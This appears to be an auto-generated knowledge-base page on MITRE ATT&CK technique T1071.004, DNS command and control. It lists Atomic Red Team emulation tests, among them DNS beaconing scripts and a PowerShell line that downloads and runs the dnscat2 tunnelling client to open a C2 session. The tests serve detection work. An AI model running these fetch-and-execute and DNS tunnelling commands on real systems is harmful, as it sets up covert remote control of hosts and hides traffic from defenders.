
# DNS

## Description

### MITRE Description

> Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) 

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1071/004

## Potential Commands

```
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer 127.0.0.1
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime 30
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain example.com -DNSServer #{server_ip}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io" -QuickTimeout}
for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter 20 -RunTime #{runtime}
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type}
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval 30 -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
```

## Commands Dataset

```
[{'command': 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type '
             '"TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum '
             '999999).#{domain}" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type '
             '"#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum '
             '999999).#{domain}" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type '
             '"#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum '
             '999999).#{domain}" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type '
             '"#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum '
             '999999).127.0.0.1.xip.io" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} '
             '-Subdomain #{subdomain} -QueryType #{query_type} -C2Interval '
             '#{c2_interval} -C2Jitter #{c2_jitter} -RunTime 30\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io '
             '-Subdomain #{subdomain} -QueryType #{query_type} -C2Interval '
             '#{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} '
             '-Subdomain atomicredteam -QueryType #{query_type} -C2Interval '
             '#{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} '
             '-Subdomain #{subdomain} -QueryType TXT -C2Interval '
             '#{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} '
             '-Subdomain #{subdomain} -QueryType #{query_type} -C2Interval 30 '
             '-C2Jitter #{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} '
             '-Subdomain #{subdomain} -QueryType #{query_type} -C2Interval '
             '#{c2_interval} -C2Jitter 20 -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} '
             '-Subdomain #{subdomain} -QueryType TXT\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} '
             '-Subdomain '
             'atomicredteamatomicredteamatomicredteamatomicredteamatomicredte '
             '-QueryType #{query_type}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain '
             '127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType '
             '#{query_type}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'IEX (New-Object '
             "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\n"
             'Start-Dnscat2 -Domain example.com -DNSServer #{server_ip}\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'},
 {'command': 'IEX (New-Object '
             "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\n"
             'Start-Dnscat2 -Domain #{domain} -DNSServer 127.0.0.1\n',
  'name': None,
  'source': 'atomics/T1071.004/T1071.004.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Application Layer Protocol: DNS': {'atomic_tests': [{'auto_generated_guid': '1700f5d6-5a44-487b-84de-bc66f507b0a6',
                                                                               'description': 'This '
                                                                                              'test '
                                                                                              'simulates '
                                                                                              'an '
                                                                                              'infected '
                                                                                              'host '
                                                                                              'sending '
                                                                                              'a '
                                                                                              'large '
                                                                                              'volume '
                                                                                              'of '
                                                                                              'DNS '
                                                                                              'queries '
                                                                                              'to '
                                                                                              'a '
                                                                                              'command '
                                                                                              'and '
                                                                                              'control '
                                                                                              'server.\n'
                                                                                              'The '
                                                                                              'intent '
                                                                                              'of '
                                                                                              'this '
                                                                                              'test '
                                                                                              'is '
                                                                                              'to '
                                                                                              'trigger '
                                                                                              'threshold '
                                                                                              'based '
                                                                                              'detection '
                                                                                              'on '
                                                                                              'the '
                                                                                              'number '
                                                                                              'of '
                                                                                              'DNS '
                                                                                              'queries '
                                                                                              'either '
                                                                                              'from '
                                                                                              'a '
                                                                                              'single '
                                                                                              'source '
                                                                                              'system '
                                                                                              'or '
                                                                                              'to '
                                                                                              'a '
                                                                                              'single '
                                                                                              'targe '
                                                                                              'domain.\n'
                                                                                              'A '
                                                                                              'custom '
                                                                                              'domain '
                                                                                              'and '
                                                                                              'sub-domain '
                                                                                              'will '
                                                                                              'need '
                                                                                              'to '
                                                                                              'be '
                                                                                              'passed '
                                                                                              'as '
                                                                                              'input '
                                                                                              'parameters '
                                                                                              'for '
                                                                                              'this '
                                                                                              'test '
                                                                                              'to '
                                                                                              'work. '
                                                                                              'Upon '
                                                                                              'execution, '
                                                                                              'DNS '
                                                                                              'information '
                                                                                              'about '
                                                                                              'the '
                                                                                              'domain '
                                                                                              'will '
                                                                                              'be '
                                                                                              'displayed '
                                                                                              'for '
                                                                                              'each '
                                                                                              'callout.\n',
                                                                               'executor': {'command': 'for($i=0; '
                                                                                                       '$i '
                                                                                                       '-le '
                                                                                                       '#{query_volume}; '
                                                                                                       '$i++) '
                                                                                                       '{ '
                                                                                                       'Resolve-DnsName '
                                                                                                       '-type '
                                                                                                       '"#{query_type}" '
                                                                                                       '"#{subdomain}.$(Get-Random '
                                                                                                       '-Minimum '
                                                                                                       '1 '
                                                                                                       '-Maximum '
                                                                                                       '999999).#{domain}" '
                                                                                                       '-QuickTimeout}\n',
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'domain': {'default': '127.0.0.1.xip.io',
                                                                                                              'description': 'Default '
                                                                                                                             'domain '
                                                                                                                             'to '
                                                                                                                             'simulate '
                                                                                                                             'against',
                                                                                                              'type': 'string'},
                                                                                                   'query_type': {'default': 'TXT',
                                                                                                                  'description': 'DNS '
                                                                                                                                 'query '
                                                                                                                                 'type',
                                                                                                                  'type': 'string'},
                                                                                                   'query_volume': {'default': '1000',
                                                                                                                    'description': 'Number '
                                                                                                                                   'of '
                                                                                                                                   'DNS '
                                                                                                                                   'queries '
                                                                                                                                   'to '
                                                                                                                                   'send',
                                                                                                                    'type': 'integer'},
                                                                                                   'subdomain': {'default': 'atomicredteam',
                                                                                                                 'description': 'Subdomain '
                                                                                                                                'prepended '
                                                                                                                                'to '
                                                                                                                                'the '
                                                                                                                                'domain '
                                                                                                                                'name',
                                                                                                                 'type': 'string'}},
                                                                               'name': 'DNS '
                                                                                       'Large '
                                                                                       'Query '
                                                                                       'Volume',
                                                                               'supported_platforms': ['windows']},
                                                                              {'auto_generated_guid': '3efc144e-1af8-46bb-8ca2-1376bb6db8b6',
                                                                               'description': 'This '
                                                                                              'test '
                                                                                              'simulates '
                                                                                              'an '
                                                                                              'infected '
                                                                                              'host '
                                                                                              'beaconing '
                                                                                              'via '
                                                                                              'DNS '
                                                                                              'queries '
                                                                                              'to '
                                                                                              'a '
                                                                                              'command '
                                                                                              'and '
                                                                                              'control '
                                                                                              'server '
                                                                                              'at '
                                                                                              'regular '
                                                                                              'intervals '
                                                                                              'over '
                                                                                              'time.\n'
                                                                                              'This '
                                                                                              'behaviour '
                                                                                              'is '
                                                                                              'typical '
                                                                                              'of '
                                                                                              'implants '
                                                                                              'either '
                                                                                              'in '
                                                                                              'an '
                                                                                              'idle '
                                                                                              'state '
                                                                                              'waiting '
                                                                                              'for '
                                                                                              'instructions '
                                                                                              'or '
                                                                                              'configured '
                                                                                              'to '
                                                                                              'use '
                                                                                              'a '
                                                                                              'low '
                                                                                              'query '
                                                                                              'volume '
                                                                                              'over '
                                                                                              'time '
                                                                                              'to '
                                                                                              'evade '
                                                                                              'threshold '
                                                                                              'based '
                                                                                              'detection.\n'
                                                                                              'A '
                                                                                              'custom '
                                                                                              'domain '
                                                                                              'and '
                                                                                              'sub-domain '
                                                                                              'will '
                                                                                              'need '
                                                                                              'to '
                                                                                              'be '
                                                                                              'passed '
                                                                                              'as '
                                                                                              'input '
                                                                                              'parameters '
                                                                                              'for '
                                                                                              'this '
                                                                                              'test '
                                                                                              'to '
                                                                                              'work. '
                                                                                              'Upon '
                                                                                              'execution, '
                                                                                              'DNS '
                                                                                              'information '
                                                                                              'about '
                                                                                              'the '
                                                                                              'domain '
                                                                                              'will '
                                                                                              'be '
                                                                                              'displayed '
                                                                                              'for '
                                                                                              'each '
                                                                                              'callout.\n',
                                                                               'executor': {'command': 'Set-Location '
                                                                                                       'PathToAtomicsFolder\n'
                                                                                                       '.\\T1071.004\\src\\T1071-dns-beacon.ps1 '
                                                                                                       '-Domain '
                                                                                                       '#{domain} '
                                                                                                       '-Subdomain '
                                                                                                       '#{subdomain} '
                                                                                                       '-QueryType '
                                                                                                       '#{query_type} '
                                                                                                       '-C2Interval '
                                                                                                       '#{c2_interval} '
                                                                                                       '-C2Jitter '
                                                                                                       '#{c2_jitter} '
                                                                                                       '-RunTime '
                                                                                                       '#{runtime}\n',
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'c2_interval': {'default': '30',
                                                                                                                   'description': 'Seconds '
                                                                                                                                  'between '
                                                                                                                                  'C2 '
                                                                                                                                  'requests '
                                                                                                                                  'to '
                                                                                                                                  'the '
                                                                                                                                  'command '
                                                                                                                                  'and '
                                                                                                                                  'control '
                                                                                                                                  'server',
                                                                                                                   'type': 'integer'},
                                                                                                   'c2_jitter': {'default': '20',
                                                                                                                 'description': 'Percentage '
                                                                                                                                'of '
                                                                                                                                'jitter '
                                                                                                                                'to '
                                                                                                                                'add '
                                                                                                                                'to '
                                                                                                                                'the '
                                                                                                                                'C2 '
                                                                                                                                'interval '
                                                                                                                                'to '
                                                                                                                                'create '
                                                                                                                                'variance '
                                                                                                                                'in '
                                                                                                                                'the '
                                                                                                                                'times '
                                                                                                                                'between '
                                                                                                                                'C2 '
                                                                                                                                'requests',
                                                                                                                 'type': 'integer'},
                                                                                                   'domain': {'default': '127.0.0.1.xip.io',
                                                                                                              'description': 'Default '
                                                                                                                             'domain '
                                                                                                                             'to '
                                                                                                                             'simulate '
                                                                                                                             'against',
                                                                                                              'type': 'string'},
                                                                                                   'query_type': {'default': 'TXT',
                                                                                                                  'description': 'DNS '
                                                                                                                                 'query '
                                                                                                                                 'type',
                                                                                                                  'type': 'string'},
                                                                                                   'runtime': {'default': '30',
                                                                                                               'description': 'Time '
                                                                                                                              'in '
                                                                                                                              'minutes '
                                                                                                                              'to '
                                                                                                                              'run '
                                                                                                                              'the '
                                                                                                                              'simulation',
                                                                                                               'type': 'integer'},
                                                                                                   'subdomain': {'default': 'atomicredteam',
                                                                                                                 'description': 'Subdomain '
                                                                                                                                'prepended '
                                                                                                                                'to '
                                                                                                                                'the '
                                                                                                                                'domain '
                                                                                                                                'name',
                                                                                                                 'type': 'string'}},
                                                                               'name': 'DNS '
                                                                                       'Regular '
                                                                                       'Beaconing',
                                                                               'supported_platforms': ['windows']},
                                                                              {'auto_generated_guid': 'fef31710-223a-40ee-8462-a396d6b66978',
                                                                               'description': 'This '
                                                                                              'test '
                                                                                              'simulates '
                                                                                              'an '
                                                                                              'infected '
                                                                                              'host '
                                                                                              'returning '
                                                                                              'data '
                                                                                              'to '
                                                                                              'a '
                                                                                              'command '
                                                                                              'and '
                                                                                              'control '
                                                                                              'server '
                                                                                              'using '
                                                                                              'long '
                                                                                              'domain '
                                                                                              'names.\n'
                                                                                              'The '
                                                                                              'simulation '
                                                                                              'involves '
                                                                                              'sending '
                                                                                              'DNS '
                                                                                              'queries '
                                                                                              'that '
                                                                                              'gradually '
                                                                                              'increase '
                                                                                              'in '
                                                                                              'length '
                                                                                              'until '
                                                                                              'reaching '
                                                                                              'the '
                                                                                              'maximum '
                                                                                              'length. '
                                                                                              'The '
                                                                                              'intent '
                                                                                              'is '
                                                                                              'to '
                                                                                              'test '
                                                                                              'the '
                                                                                              'effectiveness '
                                                                                              'of '
                                                                                              'detection '
                                                                                              'of '
                                                                                              'DNS '
                                                                                              'queries '
                                                                                              'for '
                                                                                              'long '
                                                                                              'domain '
                                                                                              'names '
                                                                                              'over '
                                                                                              'a '
                                                                                              'set '
                                                                                              'threshold.\n'
                                                                                              ' '
                                                                                              'Upon '
                                                                                              'execution, '
                                                                                              'DNS '
                                                                                              'information '
                                                                                              'about '
                                                                                              'the '
                                                                                              'domain '
                                                                                              'will '
                                                                                              'be '
                                                                                              'displayed '
                                                                                              'for '
                                                                                              'each '
                                                                                              'callout.\n',
                                                                               'executor': {'command': 'Set-Location '
                                                                                                       'PathToAtomicsFolder\n'
                                                                                                       '.\\T1071.004\\src\\T1071-dns-domain-length.ps1 '
                                                                                                       '-Domain '
                                                                                                       '#{domain} '
                                                                                                       '-Subdomain '
                                                                                                       '#{subdomain} '
                                                                                                       '-QueryType '
                                                                                                       '#{query_type}\n',
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'domain': {'default': '127.0.0.1.xip.io',
                                                                                                              'description': 'Default '
                                                                                                                             'domain '
                                                                                                                             'to '
                                                                                                                             'simulate '
                                                                                                                             'against',
                                                                                                              'type': 'string'},
                                                                                                   'query_type': {'default': 'TXT',
                                                                                                                  'description': 'DNS '
                                                                                                                                 'query '
                                                                                                                                 'type',
                                                                                                                  'type': 'string'},
                                                                                                   'subdomain': {'default': 'atomicredteamatomicredteamatomicredteamatomicredteamatomicredte',
                                                                                                                 'description': 'Subdomain '
                                                                                                                                'prepended '
                                                                                                                                'to '
                                                                                                                                'the '
                                                                                                                                'domain '
                                                                                                                                'name '
                                                                                                                                '(should '
                                                                                                                                'be '
                                                                                                                                '63 '
                                                                                                                                'characters '
                                                                                                                                'to '
                                                                                                                                'test '
                                                                                                                                'maximum '
                                                                                                                                'length)',
                                                                                                                 'type': 'string'}},
                                                                               'name': 'DNS '
                                                                                       'Long '
                                                                                       'Domain '
                                                                                       'Query',
                                                                               'supported_platforms': ['windows']},
                                                                              {'auto_generated_guid': 'e7bf9802-2e78-4db9-93b5-181b7bcd37d7',
                                                                               'description': 'This '
                                                                                              'will '
                                                                                              'attempt '
                                                                                              'to '
                                                                                              'start '
                                                                                              'a '
                                                                                              'C2 '
                                                                                              'session '
                                                                                              'using '
                                                                                              'the '
                                                                                              'DNS '
                                                                                              'protocol. '
                                                                                              'You '
                                                                                              'will '
                                                                                              'need '
                                                                                              'to '
                                                                                              'have '
                                                                                              'a '
                                                                                              'listener '
                                                                                              'set '
                                                                                              'up '
                                                                                              'and '
                                                                                              'create '
                                                                                              'DNS '
                                                                                              'records '
                                                                                              'prior '
                                                                                              'to '
                                                                                              'executing '
                                                                                              'this '
                                                                                              'command.\n'
                                                                                              'The '
                                                                                              'following '
                                                                                              'blogs '
                                                                                              'have '
                                                                                              'more '
                                                                                              'information.\n'
                                                                                              '\n'
                                                                                              'https://github.com/iagox86/dnscat2\n'
                                                                                              '\n'
                                                                                              'https://github.com/lukebaggett/dnscat2-powershell\n',
                                                                               'executor': {'command': 'IEX '
                                                                                                       '(New-Object '
                                                                                                       "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\n"
                                                                                                       'Start-Dnscat2 '
                                                                                                       '-Domain '
                                                                                                       '#{domain} '
                                                                                                       '-DNSServer '
                                                                                                       '#{server_ip}\n',
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'domain': {'default': 'example.com',
                                                                                                              'description': 'Domain '
                                                                                                                             'Name '
                                                                                                                             'configured '
                                                                                                                             'to '
                                                                                                                             'use '
                                                                                                                             'DNS '
                                                                                                                             'Server '
                                                                                                                             'where '
                                                                                                                             'your '
                                                                                                                             'C2 '
                                                                                                                             'listener '
                                                                                                                             'is '
                                                                                                                             'running',
                                                                                                              'type': 'string'},
                                                                                                   'server_ip': {'default': '127.0.0.1',
                                                                                                                 'description': 'IP '
                                                                                                                                'address '
                                                                                                                                'of '
                                                                                                                                'DNS '
                                                                                                                                'server '
                                                                                                                                'where '
                                                                                                                                'your '
                                                                                                                                'C2 '
                                                                                                                                'listener '
                                                                                                                                'is '
                                                                                                                                'running',
                                                                                                                 'type': 'string'}},
                                                                               'name': 'DNS '
                                                                                       'C2',
                                                                               'supported_platforms': ['windows']}],
                                                             'attack_technique': 'T1071.004',
                                                             'display_name': 'Application '
                                                                             'Layer '
                                                                             'Protocol: '
                                                                             'DNS'}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations


* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)

* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    

# Actors


* [FIN7](../actors/FIN7.md)

* [APT41](../actors/APT41.md)
    
* [APT18](../actors/APT18.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [APT39](../actors/APT39.md)
    
